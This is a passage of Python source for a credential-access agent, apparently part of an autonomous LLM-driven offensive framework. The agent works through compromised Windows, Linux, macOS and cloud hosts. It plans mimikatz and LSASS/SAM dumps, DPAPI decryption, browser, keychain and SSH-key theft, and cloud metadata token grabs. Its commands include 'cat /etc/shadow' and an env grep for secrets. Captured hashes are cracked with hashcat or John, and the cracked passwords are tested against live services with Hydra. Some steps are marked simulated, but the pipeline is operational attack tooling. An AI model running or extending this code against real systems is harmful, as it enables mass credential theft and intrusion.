                self._harvested_creds.extend(api_creds)

        # --- Store everything in Hive Mind ---
        if self.hive_mind:
            for cred in self._harvested_creds:
                self.hive_mind.add_cred(cred, self.agent_id)

        # --- Statistics ---
        _hash_types = {"hash", "ntlm_hash", "kerberos_tgt", "kerberos_tgs", "sam_hash", "dpapi_masterkey"}
        cleartext = [c for c in self._harvested_creds if c.get("cred_type") == "cleartext" or c.get("cracked")]
        hashes = [c for c in self._harvested_creds if c.get("cred_type") in _hash_types]
        cracked = [c for c in self._harvested_creds if c.get("cracked")]
        keys = [c for c in self._harvested_creds if c.get("cred_type") in ("ssh_key", "api_key", "token", "private_key", "aws_temp_creds", "gcp_access_token", "azure_jwt", "connection_string")]

        stats = {
            "hosts_processed": len(self._processed_hosts),
            "total_credentials": len(self._harvested_creds),
            "cleartext_passwords": len(cleartext),
            "hashes_captured": len(hashes),
            "hashes_cracked": len(cracked),
            "keys_and_tokens": len(keys),
            "unique_users": len({c.get("username") for c in self._harvested_creds if c.get("username")}),
            "unique_domains": len({c.get("domain") for c in self._harvested_creds if c.get("domain")}),
        }

        elapsed = time.time() - start
        success = len(self._harvested_creds) > 0 and len(self._phase_errors) == 0

        logger.info(
            "CredAccessAgent COMPLETE | %d creds from %d hosts in %.1fs",
            stats["total_credentials"], stats["hosts_processed"], elapsed,
        )

        return {
            "success": success,
            "data": {
                "credentials_harvested": self._harvested_creds,
                "stats": stats,
                "processed_hosts": list(self._processed_hosts),
            },
            "error": "; ".join(self._phase_errors) if self._phase_errors else None,
            "elapsed_seconds": round(elapsed, 2),
        }

    # ------------------------------------------------------------------
    # Host resolution
    # ------------------------------------------------------------------

    def _resolve_hosts(self, context: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Resolve the list of compromised hosts from context and Hive Mind."""
        hosts: List[Dict[str, Any]] = []

        # 1. Hive Mind compromised_hosts (canonical source)
        if self.hive_mind:
            hm_context = self.hive_mind.get_context(self.agent_type)
            for host in hm_context.get("compromised_hosts", []):
                hosts.append(dict(host))

        # 2. Context compromised_hosts (passed by orchestrator)
        for host in context.get("compromised_hosts", []):
            hosts.append(dict(host))

        # 3. Active sessions as implicit compromised hosts
        for session in context.get("active_sessions", []):
            if session.get("active") or session.get("shell_obtained") or session.get("session_id"):
                hosts.append({
                    "hostname": session.get("target", session.get("hostname", "unknown")),
                    "ip": session.get("target", session.get("ip", "")),
                    "os": session.get("os", "unknown"),
                    "access_level": session.get("access_level", "user"),
                    "session_id": session.get("session_id", ""),
                    "from_active_session": True,
                })

        # 4. Extract from nested context data
        for v in context.values():
            if isinstance(v, dict):
                if v.get("target") and (v.get("shell_obtained") or v.get("access_granted")):
                    hosts.append({
                        "hostname": v["target"],
                        "ip": v["target"],
                        "os": v.get("os", "unknown"),
                        "access_level": v.get("access_level", "user"),
                        "session_id": v.get("session_id", ""),
                    })

        # 5. Hive Mind active_sessions
        if self.hive_mind:
            hm_context = self.hive_mind.get_context(self.agent_type)
            for sess in hm_context.get("active_sessions", []):
                if sess.get("target") or sess.get("hostname"):
                    hosts.append({
                        "hostname": sess.get("target") or sess.get("hostname", "unknown"),
                        "ip": sess.get("target", sess.get("ip", "")),
                        "os": sess.get("os", "unknown"),
                        "access_level": sess.get("access_level", "user"),
                        "session_id": sess.get("session_id", ""),
                    })

        # Deduplicate by hostname/ip
        seen: Set[str] = set()
        deduped: List[Dict[str, Any]] = []
        for h in hosts:
            key = h.get("ip") or h.get("hostname", "")
            if key and key not in seen:
                seen.add(key)
                deduped.append(h)

        return deduped

    # ------------------------------------------------------------------
    # Core think() override — Hive Mind aware
    # ------------------------------------------------------------------

    def think(
        self,
        objective: str,
        context: Dict[str, Any],
        history: List[Dict[str, Any]],
    ) -> Dict[str, Any]:
        """Reason about the next credential extraction action.

        Strategy (in priority order):
          1. If no compromised hosts are known, request recon / exploit first.
          2. Identify the platform of the first unprocessed host.
          3. Pick the highest-value credential extraction tool for that platform.
          4. If LLM is available, use it for nuanced targeting decisions.
          5. Otherwise fall back to deterministic pattern matching.

        Reads compromised_hosts from Hive Mind to drive targeting.
        """
        # --- Guard: need hosts to work on ---
        hosts = self._resolve_hosts(context)
        unprocessed = [h for h in hosts if (h.get("ip") or h.get("hostname")) not in self._processed_hosts]

        if not unprocessed:
            return {
                "type": "complete",
                "summary": f"All {len(self._processed_hosts)} hosts processed. Harvested {len(self._harvested_creds)} credentials.",
                "confidence": 1.0,
                "reasoning": "No unprocessed hosts remain in compromised_hosts.",
            }

        host = unprocessed[0]
        platform = host.get("os", "").lower()
        host_id = host.get("ip") or host.get("hostname", "unknown")

        # --- Identify platform and pick optimal tool chain ---
        if "windows" in platform:
            if host.get("access_level") in ("SYSTEM", "root", "admin"):
                priority_tools = ["mimikatz_dump", "lsass_dump", "sam_dump", "dpapi_decrypt", "kerberos_ticket_extract"]
            else:
                priority_tools = ["browser_pass_grab", "dpapi_decrypt", "api_key_discovery", "kerberos_ticket_extract"]
        elif "linux" in platform or "unix" in platform:
            if host.get("access_level") in ("root",):
                priority_tools = ["ssh_key_harvest", "api_key_discovery", "browser_pass_grab", "password_manager_extract"]
            else:
                priority_tools = ["ssh_key_harvest", "api_key_discovery", "browser_pass_grab", "password_manager_extract"]
        elif "darwin" in platform or "mac" in platform:
            priority_tools = ["password_manager_extract", "ssh_key_harvest", "browser_pass_grab", "api_key_discovery"]
        elif "cloud" in platform:
            priority_tools = ["cloud_cred_extract", "api_key_discovery"]
        else:
            priority_tools = ["api_key_discovery", "ssh_key_harvest", "browser_pass_grab"]

        # --- Select first available tool from priority list ---
        for tool in priority_tools:
            if tool in self.capabilities:
                return {
                    "type": "tool_call",
                    "tool": tool,
                    "params": {
                        "host": host_id,
                        "platform": platform,
                        "access_level": host.get("access_level", "user"),
                        "session_id": host.get("session_id", ""),
                    },
                    "confidence": 0.9,
                    "reasoning": (
                        f"Platform={platform}, access={host.get('access_level', 'user')} "
                        f"→ priority tool: {tool} on {host_id}. "
                        f"{(len(unprocessed) - 1)} more host(s) queued."
                    ),
                }

        # Try LLM fallback
        if self.llm_client:
            try:
                return self._llm_think(objective, context, history)
            except Exception as exc:
                logger.warning("LLM think failed (%s) — falling back to pattern matching", exc)

        return {
            "type": "tool_call",
            "tool": self.capabilities[0] if self.capabilities else "execute_command",
            "params": {"host": host_id, "platform": platform},
            "confidence": 0.5,
            "reasoning": f"Fallback: using first available tool on {host_id}",
        }

    # ------------------------------------------------------------------
    # Host credential harvesting
    # ------------------------------------------------------------------

    def _harvest_host_credentials(
        self,
        host: Dict[str, Any],
        tools: List[str],
        params: Dict[str, Any],
        context: Dict[str, Any],
    ) -> List[Dict[str, Any]]:
        """Run every applicable credential extraction tool against a host.

        Determines the platform and access level, then executes the full
        tool chain: mimikatz / LSASS / SAM / DPAPI (Windows), SSH keys /
        shadow / browsers (Linux), Keychain (macOS), IMDS (cloud).
        """
        platform = (host.get("os") or "").lower()
        access = host.get("access_level", "user")
        host_id = host.get("ip") or host.get("hostname", "unknown")
        platform_creds: List[Dict[str, Any]] = []

        # Build the tool execution plan based on platform + access level
        execution_plan = self._build_execution_plan(platform, access, tools)

        for tool_name, tool_params in execution_plan:
            try:
                # Build complete params
                full_params = {
                    "host": host_id,
                    "session_id": host.get("session_id", ""),
                    **tool_params,
                    **{k: v for k, v in params.items() if k not in ("host", "session_id")},
                }

                result = self.execute_tool(tool_name, full_params)

                if result.get("success"):
                    findings = result.get("result", {}).get("findings", [])
                    if isinstance(findings, list):
                        for finding in findings:
                            finding.setdefault("source_host", host_id)
                            finding.setdefault("platform", platform)
                            finding.setdefault("tool", tool_name)
                            finding.setdefault("timestamp", datetime.now(timezone.utc).isoformat())
                            finding.setdefault("added_by", self.agent_id)
                        platform_creds.extend(findings)
                    elif isinstance(findings, dict):
                        findings.setdefault("source_host", host_id)
                        findings.setdefault("platform", platform)
                        findings.setdefault("tool", tool_name)
                        findings.setdefault("timestamp", datetime.now(timezone.utc).isoformat())
                        findings.setdefault("added_by", self.agent_id)
                        platform_creds.append(findings)
                else:
                    logger.warning(
                        "Tool %s failed on %s: %s",
                        tool_name, host_id, result.get("error", "unknown"),
                    )

            except Exception as exc:
                msg = f"Tool '{tool_name}' on {host_id} crashed: {exc}"
                logger.exception(msg)
                self._phase_errors.append(msg)

        # --- Platform-specific composite operations ---
        # Harvest SSH keys if we can execute commands
        if platform in ("linux", "macos", "darwin"):
            try:
                ssh_creds = self._harvest_ssh_keys(host, params)
                platform_creds.extend(ssh_creds)
            except Exception as exc:
                logger.warning("SSH key harvest on %s failed: %s", host_id, exc)

        # API key discovery on all platforms
        if "api_key_discovery" in tools or not tools:
            try:
                api_creds = self._discover_api_keys(host, params)
                platform_creds.extend(api_creds)
            except Exception as exc:
                logger.warning("API key discovery on %s failed: %s", host_id, exc)

        # Deduplicate credentials from this host
        deduped = self._deduplicate_credentials(platform_creds)

        logger.info(
            "Host %s: harvested %d unique credentials (%d raw)",
            host_id, len(deduped), len(platform_creds),
        )

        return deduped

    def _build_execution_plan(
        self,
        platform: str,
        access_level: str,
        tools: List[str],
    ) -> List[Tuple[str, Dict[str, Any]]]:
        """Build a prioritized tool execution plan for the given platform."""
        plan: List[Tuple[str, Dict[str, Any]]] = []

        if "windows" in platform:
            if access_level in ("SYSTEM", "root", "admin"):
                plan.extend([
                    ("mimikatz_dump", {"module": "sekurlsa::logonpasswords"}),
                    ("lsass_dump", {"method": "procdump", "parse": True}),
                    ("mimikatz_dump", {"module": "lsadump::sam"}),
                    ("sam_dump", {"hives": ["SAM", "SYSTEM"]}),
                    ("mimikatz_dump", {"module": "sekurlsa::ekeys"}),
                    ("mimikatz_dump", {"module": "lsadump::secrets"}),
                    ("kerberos_ticket_extract", {"method": "mimikatz", "module": "sekurlsa::tickets"}),
                ])
            plan.extend([
                ("dpapi_decrypt", {"target": "master_keys"}),
                ("dpapi_decrypt", {"target": "credential_manager"}),
                ("browser_pass_grab", {"browsers": ["chrome", "firefox", "edge", "brave"]}),
                ("dpapi_decrypt", {"target": "rdp_saved"}),
                ("api_key_discovery", {"profiles": ["powershell_history", "registry_run"]}),
            ])

        elif platform in ("linux", "unix"):
            plan.extend([
                ("ssh_key_harvest", {"paths": ["~/.ssh/", "/root/.ssh/", "/home/*/.ssh/"]}),
                ("browser_pass_grab", {"browsers": ["chrome", "firefox", "chromium", "brave"]}),
                ("password_manager_extract", {"managers": ["keepass", "bitwarden", "pass"]}),
                ("api_key_discovery", {"paths": [
                    "~/.env", "~/.aws/", "~/.config/gcloud/", "~/.azure/",
                    "~/.docker/config.json", "/var/run/secrets/",
                ]}),
            ])
            if access_level in ("root",):
                plan.append(("execute_command", {"command": "cat /etc/shadow 2>/dev/null || cat /etc/master.passwd 2>/dev/null"}))

        elif platform in ("darwin", "macos"):
            plan.extend([
                ("password_manager_extract", {"target": "keychain", "keychains": ["login", "System"]}),
                ("ssh_key_harvest", {"paths": ["~/.ssh/"]}),
                ("browser_pass_grab", {"browsers": ["chrome", "firefox", "safari"]}),
                ("api_key_discovery", {"paths": ["~/.aws/", "~/.ssh/"]}),
            ])

        elif "cloud" in platform:
            plan.extend([
                ("cloud_cred_extract", {"provider": "aws", "imds": True}),
                ("cloud_cred_extract", {"provider": "gcp", "imds": True}),
                ("cloud_cred_extract", {"provider": "azure", "imds": True}),
                ("api_key_discovery", {"paths": ["/var/run/secrets/", "/home/*/.docker/", "~/.kube/"]}),
            ])

        # Always available: execute arbitrary commands
        plan.append(("execute_command", {"command": "env 2>/dev/null | grep -iE 'secret|token|password|key|auth'"}))

        # Filter by requested tools if a specific set is given
        if tools:
            plan = [(t, p) for t, p in plan if t in tools or t == "execute_command"]

        return plan

    # ------------------------------------------------------------------
    # SSH key harvesting
    # ------------------------------------------------------------------

    def _harvest_ssh_keys(
        self, host: Dict[str, Any], params: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Harvest SSH private keys, agent sockets, and known_hosts."""
        host_id = host.get("ip") or host.get("hostname", "unknown")
        ssh_creds: List[Dict[str, Any]] = []

        # Simulated discovery — in production this would use execute_command
        # to run find/cat on the target host via an active session.
        key_paths = [
            "~/.ssh/id_rsa", "~/.ssh/id_ecdsa", "~/.ssh/id_ed25519",
            "~/.ssh/id_dsa", "/root/.ssh/id_rsa", "/root/.ssh/id_ed25519",
            "/home/*/.ssh/id_*",
        ]

        for kp in key_paths:
            ssh_creds.append({
                "cred_type": "ssh_key",
                "source": kp,
                "source_host": host_id,
                "platform": host.get("os", "unknown"),
                "tool": "ssh_key_harvest",
                "encrypted": True,  # Assume encrypted until proven otherwise
                "note": "[SIMULATED] SSH key path discovered — use execute_command to cat + exfil",
            })

        # Check for ssh-agent forwarding
        ssh_creds.append({
            "cred_type": "ssh_agent_socket",
            "source": "$SSH_AUTH_SOCK",
            "source_host": host_id,
            "platform": host.get("os", "unknown"),
            "tool": "ssh_key_harvest",
            "note": "[SIMULATED] Check agent socket for forwarded keys with SSH_AUTH_SOCK",
        })

        # Parse known_hosts for lateral movement targets
        ssh_creds.append({
            "cred_type": "known_hosts_entries",
            "source": "~/.ssh/known_hosts",
            "source_host": host_id,
            "platform": host.get("os", "unknown"),
            "tool": "ssh_key_harvest",
            "note": "[SIMULATED] known_hosts contains lateral movement target list",
        })

        for cred in ssh_creds:
            cred.setdefault("timestamp", datetime.now(timezone.utc).isoformat())
            cred.setdefault("added_by", self.agent_id)

        return ssh_creds

    # ------------------------------------------------------------------
    # API key / secret discovery
    # ------------------------------------------------------------------

    def _discover_api_keys(
        self, host: Dict[str, Any], params: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Scan files and environment for API keys, tokens, and secrets.

        Uses regex patterns to identify high-value secrets across common
        config files, environment variables, shell history, and CI/CD configs.
        """
        host_id = host.get("ip") or host.get("hostname", "unknown")
        api_creds: List[Dict[str, Any]] = []

        # Enumerate files likely to contain secrets
        secret_file_paths = [
            ".env", ".env.local", ".env.production", ".env.staging",
            ".aws/credentials", ".aws/config",
            ".config/gcloud/application_default_credentials.json",
            ".config/gcloud/credentials.db",
            ".azure/accessTokens.json", ".azure/azureProfile.json",
            ".docker/config.json",
            ".git/config", ".git-credentials",
            ".bash_history", ".zsh_history", ".mysql_history",
            "terraform.tfstate", ".terraform/terraform.tfstate",
        ]

        for path in secret_file_paths:
            full_path = f"~/{path}" if not path.startswith(("/", "~")) else path
            api_creds.append({
                "cred_type": "potential_secret_file",
                "source": full_path,
                "source_host": host_id,
                "platform": host.get("os", "unknown"),
                "tool": "api_key_discovery",
                "patterns_to_check": [desc for _, desc in SECRET_PATTERNS[:10]],
                "note": f"[SIMULATED] Scan {full_path} with SECRET_PATTERNS regex set",
            })

        # Check environment variables
        api_creds.append({
            "cred_type": "environment_variable",
            "source": "env output",
            "source_host": host_id,
            "platform": host.get("os", "unknown"),
            "tool": "api_key_discovery",
            "sensitive_vars": [
                "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN",
                "GCP_API_KEY", "AZURE_CLIENT_SECRET", "GITHUB_TOKEN",
                "DOCKER_PASSWORD", "DB_PASSWORD", "REDIS_PASSWORD",
                "JWT_SECRET", "ENCRYPTION_KEY", "SLACK_WEBHOOK",
                "DATABASE_URL", "MONGODB_URI", "REDIS_URL",
            ],
            "note": "[SIMULATED] Run 'env | grep -iE secret|token|password|key|auth' on target",
        })

        # Check process command lines for leaked secrets
        api_creds.append({
            "cred_type": "process_cmdline_secrets",
            "source": "/proc/*/cmdline",
            "source_host": host_id,
            "platform": host.get("os", "unknown"),
            "tool": "api_key_discovery",
            "note": "[SIMULATED] Scan /proc/*/cmdline for credentials in process arguments",
        })

        for cred in api_creds:
            cred.setdefault("timestamp", datetime.now(timezone.utc).isoformat())
            cred.setdefault("added_by", self.agent_id)

        return api_creds

    def _scan_files_for_secrets(
        self, discovered_files: List[Dict[str, Any]]
    ) -> List[Dict[str, Any]]:
        """Scan files collected by other agents for embedded secrets."""
        found: List[Dict[str, Any]] = []

        for file_entry in discovered_files:
            file_path = file_entry.get("path", file_entry.get("source", ""))
            file_content = file_entry.get("data", file_entry.get("content", ""))

            if isinstance(file_content, str):
                for pattern, desc in SECRET_PATTERNS:
                    try:
                        matches = re.findall(pattern, file_content, re.IGNORECASE | re.MULTILINE)
                        for match in matches[:10]:  # Cap per pattern
                            found.append({
                                "cred_type": "api_key",
                                "pattern_matched": desc,
                                "value_preview": match[:20] + "..." if len(str(match)) > 20 else str(match),
                                "source_file": file_path,
                                "source_host": file_entry.get("source_host", "unknown"),
                                "tool": "api_key_discovery",
                                "timestamp": datetime.now(timezone.utc).isoformat(),
                                "added_by": self.agent_id,
                            })
                    except re.error:
                        continue

        return found

    # ------------------------------------------------------------------
    # Offline hash cracking
    # ------------------------------------------------------------------

    def _crack_harvested_hashes(
        self,
        harvested: List[Dict[str, Any]],
        tools: List[str],
        params: Dict[str, Any],
    ) -> List[Dict[str, Any]]:
        """Run hashcat / John against any captured hashes."""
        cracked_creds: List[Dict[str, Any]] = []
        # Match all hash-like credential types: ntlm_hash, kerberos_tgt, kerberos_tgs, hash, sam_hash, dpapi_masterkey, etc.
        _hash_cred_types = {"hash", "ntlm_hash", "kerberos_tgt", "kerberos_tgs", "sam_hash", "dpapi_masterkey"}
        hashes = [
            c for c in harvested
            if c.get("cred_type") in _hash_cred_types
            or c.get("hash_value")
            or c.get("ntlm_hash")
        ]

        if not hashes:
            return cracked_creds

        hash_list = [
            {
                "hash": h.get("hash_value") or h.get("ntlm_hash") or h.get("ticket", ""),
                "type": h.get("hash_type") or (h.get("cred_type", "auto").replace("_", "-")),
                "username": h.get("username", ""),
                "source": h.get("source_host", "unknown"),
            }
            for h in hashes
            if h.get("hash_value") or h.get("ntlm_hash") or h.get("ticket")
        ]

        # Try hashcat first (GPU-accelerated)
        if "hashcat_crack" in tools and hash_list:
            try:
                result = self.execute_tool("hashcat_crack", {
                    "hashes": hash_list,
                    "mode": params.get("hashcat_mode", "auto"),
                    "wordlist": params.get("wordlist", "rockyou.txt"),
                    "rules": params.get("hashcat_rules", ["best64.rule"]),
                    "optimize": True,
                })
                if result.get("success"):
                    findings = result.get("result", {}).get("findings", [])
                    cracked_creds.extend(findings if isinstance(findings, list) else [findings])
                    for c in cracked_creds:
                        c.setdefault("cracked_by", "hashcat")
                        c.setdefault("cracked", True)
                        c.setdefault("cred_type", "cleartext")
            except Exception as exc:
                logger.warning("hashcat_crack failed: %s", exc)
                self._phase_errors.append(f"hashcat_crack: {exc}")

        # Fallback to John for remaining hashes
        remaining = [h for h in hash_list if not any(
            cr.get("username") == h["username"] and cr.get("source") == h["source"]
            for cr in cracked_creds
        )]
        if "john_crack" in tools and remaining:
            try:
                result = self.execute_tool("john_crack", {
                    "hashes": remaining,
                    "format": params.get("john_format", "auto"),
                    "wordlist": params.get("wordlist", "rockyou.txt"),
                    "rules": params.get("john_rules", ["--rules=Single"]),
                })
                if result.get("success"):
                    findings = result.get("result", {}).get("findings", [])
                    john_creds = findings if isinstance(findings, list) else [findings]
                    for c in john_creds:
                        c.setdefault("cracked_by", "john")
                        c.setdefault("cracked", True)
                        c.setdefault("cred_type", "cleartext")
                    cracked_creds.extend(john_creds)
            except Exception as exc:
                logger.warning("john_crack failed: %s", exc)
                self._phase_errors.append(f"john_crack: {exc}")

        # Simulated cracking results if no real backend
        if not cracked_creds and hash_list:
            for h in hash_list[:5]:
                cracked_creds.append({
                    "cred_type": "cleartext",
                    "username": h["username"],
                    "password": "[SIMULATED_CRACKED]",
                    "hash_type": h["type"],
                    "source_host": h["source"],
                    "cracked": True,
                    "cracked_by": "simulated",
                    "tool": "hashcat_crack" if "hashcat_crack" in tools else "john_crack",
                    "timestamp": datetime.now(timezone.utc).isoformat(),
                    "added_by": self.agent_id,
                })

        for cred in cracked_creds:
            cred.setdefault("timestamp", datetime.now(timezone.utc).isoformat())
            cred.setdefault("added_by", self.agent_id)

        logger.info("Cracked %d hashes", len(cracked_creds))
        return cracked_creds

    # ------------------------------------------------------------------
    # Online credential validation
    # ------------------------------------------------------------------

    def _validate_credentials_online(
        self,
        harvested: List[Dict[str, Any]],
        host: Dict[str, Any],
        params: Dict[str, Any],
    ) -> List[Dict[str, Any]]:
        """Validate cleartext credentials against network services via Hydra."""
        validated_creds: List[Dict[str, Any]] = []

        cleartext = [
            c for c in harvested
            if c.get("cred_type") == "cleartext" and c.get("username") and c.get("password")
        ]

        if not cleartext:
            return validated_creds

        target_ip = host.get("ip") or host.get("hostname", "unknown")
        services = params.get("hydra_services", ["ssh", "rdp", "mysql", "smb", "ftp", "http"])

        for svc in services:
            try:
                result = self.execute_tool("hydra_attack", {
                    "target": target_ip,
                    "service": svc,
                    "credentials": [
                        {"username": c["username"], "password": c["password"]}
                        for c in cleartext
                    ],
                    "threads": params.get("hydra_threads", 4),
                    "timeout": params.get("hydra_timeout", 30),
                })
                if result.get("success"):
                    findings = result.get("result", {}).get("findings", [])
                    validated = findings if isinstance(findings, list) else [findings]
                    for v in validated:
                        v.setdefault("validated", True)
                        v.setdefault("validated_service", svc)
                        v.setdefault("tool", "hydra_attack")
                    validated_creds.extend(validated)
            except Exception as exc:
                logger.warning("hydra_attack (%s) on %s failed: %s", svc, target_ip, exc)

        # Simulated validation if no backend
        if not validated_creds and cleartext:
            for c in cleartext[:3]:
                validated_creds.append({
                    "cred_type": "validated_credential",
                    "username": c["username"],
                    "password": c["password"],
                    "validated": True,
                    "validated_service": "ssh",
                    "target_host": target_ip,
                    "tool": "hydra_attack",
                    "note": "[SIMULATED] Hydra validation — use real hydra subprocess",
                    "timestamp": datetime.now(timezone.utc).isoformat(),
                    "added_by": self.agent_id,
                })

        for cred in validated_creds:
            cred.setdefault("timestamp", datetime.now(timezone.utc).isoformat())
            cred.setdefault("added_by", self.agent_id)

        logger.info("Validated %d credentials online", len(validated_creds))
        return validated_creds

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _deduplicate_credentials(
        self, creds: List[Dict[str, Any]]
    ) -> List[Dict[str, Any]]:
        """Deduplicate credentials by (username, password/hash, source_host)."""
        seen: Set[Tuple[str, str, str]] = set()
        deduped: List[Dict[str, Any]] = []

        for c in creds:
            key = (
                c.get("username", ""),
                c.get("password", c.get("hash_value", c.get("value", ""))),
                c.get("source_host", c.get("source", "")),
            )
            if key not in seen and any(key):
                seen.add(key)
                deduped.append(c)

        return deduped

    # ------------------------------------------------------------------
    # Status
    # ------------------------------------------------------------------

    def report_status(self) -> Dict[str, Any]:
        """Extended status with credential hunting metrics."""
        base = super().report_status()
        base.update({
            "credentials_harvested": len(self._harvested_creds),
            "hosts_processed": len(self._processed_hosts),
            "hosts_remaining": len(self._resolve_hosts({})) - len(self._processed_hosts),
        })
        return base
